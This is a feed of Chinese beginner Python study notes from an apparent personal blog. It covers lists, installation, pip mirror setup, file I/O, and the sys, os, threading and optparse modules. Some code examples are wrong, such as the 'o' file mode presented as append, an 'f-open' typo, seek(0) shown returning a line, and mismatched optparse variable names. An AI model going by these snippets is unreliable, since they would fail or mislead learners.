operator">></span> list1 <span class="token operator">></span> list2<span class="token boolean">False</span>        <span class="token comment">#列表有多个元素比较大小时，只比较第一个元素的大小来确定列表大小</span><span class="token operator">>></span><span class="token operator">></span> list3 <span class="token operator">=</span> list1 <span class="token operator">+</span> list2<span class="token operator">>></span><span class="token operator">></span> list3           <span class="token comment">#可以相加</span><span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">456</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> list4 <span class="token operator">=</span> list3<span class="token operator">>></span><span class="token operator">></span> list4         <span class="token comment">#虽说是复制但真正用时这两个列表的变化是关联的</span><span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">456</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> list3 <span class="token operator">*</span> <span class="token number">3</span>                <span class="token comment">#打印多次可以这么用</span><span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">456</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">456</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">456</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">]</span></code></pre><p>等于跟拷贝是两个概念，不一样的。等于是指对于这个列表，只是多了一个指向它的标签；而拷贝则是在新的空间复制了一份，占用了额外的内存。两者不同！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python入坑学习笔记(1)</title>
      <link href="/posts/da47a0d2/"/>
      <url>/posts/da47a0d2/</url>
      
        <content type="html"><![CDATA[<h1 id="python简介"><a href="#python简介" class="headerlink" title="python简介"></a>python简介</h1><p>python是一门应用比较广泛的编程语言，python语言在编程家族中的地位还是比较高的。<br>Python 对初级程序员而言，是一种伟大的语言，它支持广泛的应用程序开发，从简单的文字处理到 <code>www</code> 浏览器再到游戏。<br>它的优点也有很多：<br>1.易学：Python有相对较少的关键字，结构简单，和一个明确定义的语法，学习起来更加简单。<br>2.易阅读：Python代码定义的更清晰。<br>3.易于维护：Python的成功在于它的源代码是相当容易维护的。<br>4.可嵌入: 你可以将Python嵌入到C/C++程序，让你的程序的用户获得”脚本化”的能力等等。</p><h1 id="python发展史"><a href="#python发展史" class="headerlink" title="python发展史"></a>python发展史</h1><p>Python 是由 Guido van Rossum 在八十年代末和九十年代初，在荷兰国家数学和计算机科学研究所设计出来的。<br>Python 本身也是由诸多其他语言发展而来的,这包括 ABC、Modula-3、C、C++、Algol-68、SmallTalk、Unix shell 和其他的脚本语言等等。像 Perl 语言一样，Python 源代码同样遵循 GPL(GNU General Public License)协议。<br>现在 Python 是由一个核心开发团队在维护，Guido van Rossum 仍然占据着至关重要的作用，指导其进展。<br>Python 2.7 被确定为最后一个 Python 2.x 版本，它除了支持 Python 2.x 语法外，还支持部分 Python 3.1 语法。</p><h1 id="python安装及环境搭配"><a href="#python安装及环境搭配" class="headerlink" title="python安装及环境搭配"></a>python安装及环境搭配</h1><p>进入python官网，传送门——&gt;<a href="https://www.python.org/">python官网</a><br>选择适合您的电脑系统的版本进行下载。<img src="https://img-blog.csdnimg.cn/20200203201314123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>下面以Windows系统为例：<br>打开浏览器访问  <a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a><img src="https://img-blog.csdnimg.cn/20200203201945413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><ul><li>右键点击”此电脑”，然后点击”属性”</li><li>然后点击”高级系统设置”</li><li>选择”系统变量”窗口下面的”Path”,双击即可！</li><li>然后在”Path”行，添加python安装路径即可(我的D:\Python32)，<br><img src="https://img-blog.csdnimg.cn/20200203205948286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></li><li>最后设置成功以后，在cmd命令行，输入命令”python”，就可以有相关显示。<br><img src="https://img-blog.csdnimg.cn/2020020321064944.png" alt="在这里插入图片描述" loading="lazy"></li></ul><p><strong>Python开发工具</strong><br>IDLE - 自带的集成开发工具<br>IDLE是安装Python环境时自带的集成开发工具。但是我们有更好的开发工具。<br>IPython - 更好的交互式编程工具<br>IPython是一种基于Python的交互式解释器。相较于原生的Python交互式环境，IPython提供了更为强大的编辑和交互功能。可以通过Python的包管理工具pip安装IPython</p><h6 id="如何安装IPython"><a href="#如何安装IPython" class="headerlink" title="如何安装IPython"></a>如何安装IPython</h6><p>首先先打开python安装目录，看看有没有pip工具。<br>1.打开目录（在您自己的电脑找您当时安装python的地方），找到Scripts文件夹<br><img src="https://img-blog.csdnimg.cn/20200205150812760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>2.打开Scripts文件夹后，你会看到pip.exe，那么我们把当前目录配置到环境变量里，然后就可以使用pip工具来安装其他第三方库了（IPython为Python的一个第三方库 ）。<img src="https://img-blog.csdnimg.cn/20200205151232931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>3.和配置Python的环境变量差不多，同样是配置到系统变量Path里。<br><img src="https://img-blog.csdnimg.cn/20200205151543384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>4.配置好后建议先升级一下pip<br>Upgrading pip（升级pip命令）<br>我的是Windows10，打开cmd输入命令<code>python -m pip install --upgrade pip</code><br><img src="https://img-blog.csdnimg.cn/20200205151958537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>安装可能会有小差错，不要慌，再试几次，三次不行的话就再找找其他办法，我的是三次输入命令才成功的。<br>5.使用pip安装IPython，命令为<code>pip install ipython</code><br>在这里，我又遇到问题了，<img src="https://img-blog.csdnimg.cn/20200205152627330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>报错是<code>time out</code>因为下载速度太慢，问过学长，才知道这一步是要换源的，python默认是国外的源，我们这里把它换成国内源，下载速度就会很快了。</p><h6 id="python的pip换源"><a href="#python的pip换源" class="headerlink" title="python的pip换源"></a>python的pip换源</h6><p>pip换源：<br>Windows下：<br>在用户目录下建立pip文件夹，进入建立pip.ini写入<br>图中位置：C:\用户\18101<br><img src="https://img-blog.csdnimg.cn/20200205153429861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>新建文件夹命名为pip，在里面建立一个文档，写入<br>清华大学pip（还有其它的国内源：阿里云、中科大等等，可自行百度选择。）</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token punctuation">[</span>global<span class="token punctuation">]</span>index<span class="token operator">-</span>url <span class="token operator">=</span> https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>pypi<span class="token punctuation">.</span>tuna<span class="token punctuation">.</span>tsinghua<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>simple</code></pre><p>文件扩展名写成<code>.ini</code><br>换源成功再次安装ipython<br><img src="https://img-blog.csdnimg.cn/20200205154257728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>不得不说，这速度贼棒！！！！！<br>6.安装好之后检查一下，再次输入<code>pip install ipython</code><br>如果安装成功的话，会提示已安装。<br><img src="https://img-blog.csdnimg.cn/20200205154636152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>到这里，python的环境配置就已经完成了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python脚本编程的知识点</title>
      <link href="/posts/94be70cd/"/>
      <url>/posts/94be70cd/</url>
      
        <content type="html"><![CDATA[<h1 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h1><ol><li>对列表进行迭代<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span>···<span class="token keyword">print</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>···<span class="token number">1</span><span class="token number">2</span><span class="token number">3</span></code></pre></li><li>通过range()函数生成连续数列<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>···<span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>···<span class="token number">1</span><span class="token number">2</span><span class="token number">3</span><span class="token number">4</span></code></pre></li><li>range(初始值,终止值,步长)，range得到的是一个左闭右开区间。<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span></code></pre><h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1></li><li>文件操作的基本流程</li></ol><ul><li>调用open()函数打开文件，并创建一个File对象</li><li>调用File对象的read()或write()等方法，对文件内容进行读写等操作。</li><li>调用File对象的close()方法，关闭并保存文件内容。</li></ul><ol start="2"><li>open()函数<br>通过open()函数以指定模式打开文件并创建文件对象：<pre class="language-python" data-language="python"><code class="language-python">文件对象<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'文件路径'</span><span class="token punctuation">,</span> <span class="token string">'模式'</span><span class="token punctuation">)</span></code></pre></li></ol><ul><li>文件打开模式主要包括：<br>1、r只读模式（默认）<br>2、w只写模式（如果文件已经存在，先清空原有内容，文件不存在则创建文件）<br>3、a追加模式（不覆盖文件中原有的内容）</li><li>如果传递给open()的文件名不存在。写模式和添加模式都会创建一个新的空文件。</li></ul><ol start="3"><li>写入文件</li></ol><ul><li>write()方法不会在字符串的末尾自动添加换行字符</li><li>向文件中写入内容：<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/ip.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"192.168.80.1\n"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"192.168.80.2\n"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"192.168.80.3\n"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li><li>向文件中追加内容：<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/ip.txt"</span><span class="token punctuation">,</span><span class="token string">"o"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"192.168.80.10\n"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"192.168.80.20\n"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li></ul><ol start="4"><li>读取文件</li></ol><ul><li>Python文件对象提供了三种“读”方法：<br>1、read()<br>read()方法可以一次性读取文件的所有内容<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/ip.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'192.168.80.1\n192.168.80.2\n192.168.80.3\n'</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>read()方法也可以指定读取前几个字节的数据：<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/ip.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token string">'192.168.80.1'</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>2、readline()<br>readline()方法可以从文件中读取一行并作为结果返回：<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> f<span class="token operator">-</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/ip.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'192.168.80.1\n'</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'192.168.80.2\n'</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>3、readlines()<br>readlines()方法返回一个列表，文件的每一行作为列表的一个元素：<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/ip.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'192.168.80.1\n'</span><span class="token punctuation">,</span> <span class="token string">'192.168.80.2\n'</span><span class="token punctuation">,</span> <span class="token string">'192.168.80.3\n'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment">#数组限定读取的信息</span><span class="token string">'192.168.80.1\n'</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>4、seek()方法可以将指针返回到指定位置。<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#返回到第一行</span><span class="token string">'192.168.80.1\n'</span></code></pre></li><li>读取文件</li></ul><ol start="5"><li>通过for循环对列表进行迭代，这是最常用的读取方法。<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/ip.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre></li><li>通过字符串strip()方法将文件中每行末尾的\n去除<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/ip.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span> <span class="token punctuation">(</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h1 id="导入模块-库"><a href="#导入模块-库" class="headerlink" title="导入模块(库)"></a>导入模块(库)</h1><h2 id="模块的概念"><a href="#模块的概念" class="headerlink" title="模块的概念"></a>模块的概念</h2></li><li>模块也叫库，每个模块中都内置了大量的功能函数、类和变量。它就像是积木，可以根据需要进行调用组合。</li><li>模块就是程序，每个模块就是一个后缀为.py的Python程序。</li><li>Python的模块分为标准模块和第三方模块，标准模块就是python内置的，第三方模块则需要安装之后才能使用。</li><li>可以通过help命令了解一个模块的基本帮助信息，如：<code>help(&#39;sys&#39;)</code><h2 id="模块导入"><a href="#模块导入" class="headerlink" title="模块导入"></a>模块导入</h2></li><li>无论标准模块还是第三方模块都需要导入。</li><li>导入方法：</li></ol><ul><li>直接调用模块：<code>import 模块名</code></li><li>从模块中调用某个函数：<code>from 模块名 import 函数名</code></li><li><code>import os</code> ，应采用“<code>模块名.方法名</code>”的形式使用模块中的方法。如：<code>os.system()</code></li><li><code>from os import *</code> ，可以直接使用system()方法，无需加上模块名作为前缀。<h1 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h1>sys是一个标准模块，与Python解释器密切相关。</li><li>（1）sys.argv<br>sys.argv是一个变量，专门用来向Python解释器传递参数，类似于Shell脚本编程中的位置变量。<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment">#coding=utf-8</span><span class="token keyword">import</span> sys<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"脚本文件是："</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"参数的数量是："</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"所有的参数："</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第一个参数是："</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第二个参数是："</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第三个参数是："</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre></li><li>（2）sys.exit()<br>sys.exit()是一个方法，作用是退出当前程序。</li></ul><ol><li>sys.exit()退出当前程序，并返回SystemExit异常。</li><li>sys.exit(0)，正常退出。</li><li>sys.exit(“程序退出”)，显示一段提示信息。<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment">#coding=utf-8</span><span class="token keyword">import</span> sys<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正确使用方法："</span><span class="token operator">+</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"IP列表文件"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"例如：./m0re.py /root/ip.txt"</span><span class="token punctuation">)</span>sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h1>os模块提供了访问操作系统服务的功能。<br>它最常用的是<code>os.system()</code>方法，可以在Python中使用操作系统命令。<pre class="language-python" data-language="python"><code class="language-python">os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"ls /root"</span><span class="token punctuation">)</span>banner<span class="token punctuation">.</span>py  flag<span class="token punctuation">.</span>sh  <span class="token keyword">pass</span><span class="token punctuation">.</span>txtip<span class="token punctuation">.</span>txt  shadow<span class="token number">0</span></code></pre>还有几个</li></ol><ul><li>os.path.isfile()方法，判断指定的对象是否为文件，返回True或False。<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token string">"/root/pass.txt"</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token string">"/root/password.txt"</span><span class="token punctuation">)</span><span class="token boolean">False</span></code></pre></li><li>os.path.isdir()方法，判断指定对象是否为目录。</li><li>os.path.exists()方法，判断指定的对象是否存在。<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">"/root/pass.txt"</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">"/root/"</span><span class="token punctuation">)</span><span class="token boolean">True</span></code></pre><h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h1>通过threading模块中的Thread()类可以创建和管理线程对象。<br>使用时，使用多线程调用一个函数，然后启动，就可以明显提高速度。<pre class="language-python" data-language="python"><code class="language-python">t<span class="token operator">=</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>checkVulns<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>用时再查<h1 id="optparse模块"><a href="#optparse模块" class="headerlink" title="optparse模块"></a>optparse模块</h1>利用该模块可以设置选项，通过选项向脚本传递所需的参数。<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> optparse <span class="token keyword">import</span> OptionParserparser<span class="token operator">=</span>OptionParser<span class="token punctuation">(</span><span class="token punctuation">)</span>parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">"-f"</span><span class="token punctuation">,</span><span class="token string">"--file"</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token string">"string"</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">"filename"</span><span class="token punctuation">)</span>parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">"-i"</span><span class="token punctuation">,</span><span class="token string">"--ip"</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token string">"string"</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">"address"</span><span class="token punctuation">)</span><span class="token punctuation">(</span>option<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token operator">=</span>parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> options<span class="token punctuation">.</span>filename<span class="token keyword">print</span> options<span class="token punctuation">.</span>address</code></pre>代码解释<pre class="language-bash" data-language="bash"><code class="language-bash">·第一行，导入optparse模块中的类OptionParser。·第二行，将类实例化成对象。·第三行，利用add_option<span class="token punctuation">(</span><span class="token punctuation">)</span>方法添加选项。-f和--file分别表示长短选项名，长选项可以省略。type指定了参数类型，默认为string，dest指定将参数赋值给哪个变量。·第四行，利用add_option<span class="token punctuation">(</span><span class="token punctuation">)</span>方法添加选项-i和-ip。·第五行，利用parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>方法来获取定义的选项和参数，可以视作一种固定用法。·parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>方法返回两个值，其中options对象保存了所传递进来的参数值。·第六、七行，通过options.filename和options.address的方式调用参数值。</code></pre></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python分布式爬虫————爬虫前奏和网络请求</title>
      <link href="/posts/7bd464e8/"/>
      <url>/posts/7bd464e8/</url>
      
